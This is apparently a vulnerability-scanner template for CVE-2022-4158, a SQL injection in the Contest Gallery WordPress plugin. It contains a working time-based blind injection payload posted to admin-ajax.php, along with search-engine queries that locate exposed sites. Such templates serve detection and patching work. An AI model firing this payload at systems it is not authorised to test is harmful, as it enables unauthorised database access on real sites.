id: CVE-2022-4158

info:
  name: Contest Gallery WordPress Plugin SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  description: The Contest Gallery WordPress plugin before 19.1.5.1 is vulnerable to SQL injection via the cg_Fields POST parameter.
  impact: |
    Successful exploitation could lead to unauthorized access to sensitive data.
  remediation: |
    Update to the latest version of the Contest Gallery WordPress Plugin to mitigate CVE-2022-4158.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2022-4158
    epss-score: 0.00216
    epss-percentile: 0.60327
    cpe: cpe:2.3:a:contest-gallery:contest_gallery:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: contest-gallery
    product: contest_gallery
    framework: wordpress
    shodan-query: http.html:"/wp-content/plugins/contest-gallery/"
    fofa-query: body=/wp-content/plugins/contest-gallery/
    publicwww-query: /wp-content/plugins/contest-gallery/

http:
  - method: POST
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php"

    body: |
      cg_current_page_id=1&cg_check=63e2eac15c3548881b7e582f807cb491fc9b8c0cb7a61631580a8db22fa29d70&action=post_cg_registry&cg_gallery_id_registry=1&cg_Fields[1][Form_Input_ID]=1/**/AND/**/(SELECT/**/7741/**/FROM/**/(SELECT(SLEEP(5)))hlAf)&cg_Fields[1][Field_Type]=user-check-agreement-field&cg_Fields[1][Field_Order]=1&cg_Fields[1][Field_Content]=testing&cg_Fields[2][Form_Input_ID]=2&cg_Fields[2][Field_Type]=main-nick-name&cg_Fields[2][Field_Order]=1&cg_Fields[2][Field_Content]=testing&cg_Fields[3][Form_Input_ID]=3&cg_Fields[3][Field_Type]=main-mail&cg_Fields[3][Field_Order]=2&cg_Fields[3][Field_Content]=ds@g.com&cg_Fields[4][Form_Input_ID]=4&cg_Fields[4][Field_Type]=password&cg_Fields[4][Field_Order]=3&cg_Fields[4][Field_Content]=testing&cg_Fields[5][Form_Input_ID]=5&cg_Fields[5][Field_Type]=password-confirm&cg_Fields[5][Field_Order]=4&cg_Fields[5][Field_Content]=testing&cg-main-mail=ds@g.com&cg-main-user-name=testing&cg-main-nick-name=testing

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
